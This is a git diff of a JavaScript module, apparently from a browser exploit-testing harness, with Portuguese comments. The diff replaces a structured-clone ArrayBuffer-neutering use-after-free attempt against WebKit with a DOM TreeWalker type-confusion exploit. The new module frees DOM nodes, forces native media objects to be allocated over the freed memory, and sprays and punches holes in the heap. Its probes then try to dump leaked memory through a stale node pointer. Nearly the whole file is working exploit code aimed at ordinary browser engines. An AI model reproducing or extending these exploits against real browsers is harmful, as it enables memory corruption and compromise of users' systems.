@@ -1,73 +1,69 @@
+import { GCOracle } from '../mod_executor.js';
+import { Groomer } from '../mod_groomer.js';
+
 export default {
-    id:       'STRUCTURED_CLONE_MUTATION',
-    category: 'Concurrency',
+    id:       'TREEWALKER_TYPE_CONFUSION',
+    category: 'Exploit',
     risk:     'CRITICAL',
     description:
-        'Ataca o SerializedScriptValue transferindo a ownership de um ArrayBuffer ' +
-        'durante a clonagem estrutural de um getter. O C++ calcula o tamanho da memória, ' +
-        'o getter arranca a memória original via transferência neutering, e o C++ retoma a cópia a ler o vazio.',
+        'Type Confusion via DOM TreeWalker. O DOM original é destruído, mas o Walker retém ' +
+        'um ponteiro stale. Injetamos elementos nativos pesados (<video>) e forçamos o relayout ' +
+        'para instanciar os objetos C++ complexos sobre a memória do TextNode antigo.',
 
     setup: function() {
-        this.results = {};
-        this.channel = new MessageChannel();
-        this.buffer = new ArrayBuffer(1024);
+        this.sandbox = document.createElement('div');
+        this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
+        document.body.appendChild(this.sandbox);
         
-        // Escrevemos algo para validar se o buffer sobrevive
-        new Uint32Array(this.buffer)[0] = 0xBADF00D;
-
-        const self = this;
-
-        // O Payload Malicioso
-        this.evilPayload = {
-            a: 1,
-            get b() {
-                try {
-                    // O GATILHO: O C++ está no meio da clonagem.
-                    // Nós usamos um segundo postMessage sincrono para transferir
-                    // (neuter) o buffer e arrancar a sua memória física.
-                    self.channel.port1.postMessage("transfer", [self.buffer]);
-                } catch(e) {}
-                return 2;
-            },
-            // O C++ vai tentar ler 'c' logo após 'b' ter destruído a memória!
-            c: this.buffer
-        };
+        this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
+        this.walker.nextNode(); // span
+        this.walker.nextNode(); // text "A" (Alvo)
+        
+        this.targetNode = this.walker.currentNode;
+        if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
     },
 
     trigger: function() {
-        try {
-            // Inicia o processo fatal de clonagem C++
-            this.channel.port1.postMessage(this.evilPayload);
-        } catch(e) {
-            this.results.error = e.constructor.name;
-        }
+        // 1. Apagamos o nó antigo (Liberta a memória no bmalloc)
+        this.sandbox.innerHTML = '';
+        
+        // 2. Injetamos elementos com estruturas C++ massivas (MediaPlayerPrivate, etc)
+        this.sandbox.innerHTML = '<video controls></video><audio></audio><iframe></iframe>';
+        
+        // FIX: Forçamos o WebKit a desenhar os elementos AGORA.
+        // Isto obriga a alocação dos objetos nativos C++ no heap, possivelmente
+        // caindo no exato mesmo endereço de memória do antigo text "A".
+        void this.sandbox.firstChild.offsetWidth;
+        
+        // Inundação secundária para empurrar o GC
+        let trash = Groomer.sprayDOM('div', 200);
+        Groomer.punchHoles(trash, 2);
     },
 
     probe: [
-        // Probe 0: O buffer foi efetivamente transferido e castrado (neutered)?
-        s => s.buffer.byteLength,
+        // Probe 0: O nó fantasma mudou de identidade?
+        s => s.walker.currentNode.nodeName,
         
-        // Probe 1: O C++ crashou internamente na clonagem ou devolveu erro ao JS?
-        s => s.results.error || 'Nenhum erro JS lançado. Verificando memória...',
-        
-        // Probe 2: Lemos o ArrayBuffer original. Se o byteLength for 0, mas conseguirmos
-        // ler dados, temos um UAF brutal do objeto nativo.
+        // Probe 1: Extrator OOB (Se o C++ achar que o vídeo é um texto)
         s => {
-            try {
-                if (s.buffer.byteLength === 0) {
-                    let view = new Uint32Array(s.buffer);
-                    if (view[0]) return `💥 INFO LEAK: 0x${view[0].toString(16)}`;
-                }
-                return 'Protegido (Acesso Negado ao Buffer Castrado)';
-            } catch(e) {
-                return 'Seguro (TypeError esperado)';
+            let nodeName = s.walker.currentNode.nodeName;
+            if (nodeName !== '#text') {
+                try {
+                    let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
+                    if (leakedData && leakedData !== 'A') {
+                        let hexDump = '';
+                        for (let i = 0; i < Math.min(leakedData.length, 16); i++) {
+                            hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
+                        }
+                        return `💥 INFO LEAK (Type Confusion Real): ${hexDump}`;
+                    }
+                } catch(e) { return `Crash seguro: ${e.message}`; }
             }
+            return 'Nó não sobreposto ou seguro';
         }
     ],
 
     cleanup: function() {
-        this.buffer = null;
-        this.evilPayload = null;
-        try { this.channel.port1.close(); } catch(e){}
+        try { this.sandbox.remove(); } catch(e) {}
     }
 };
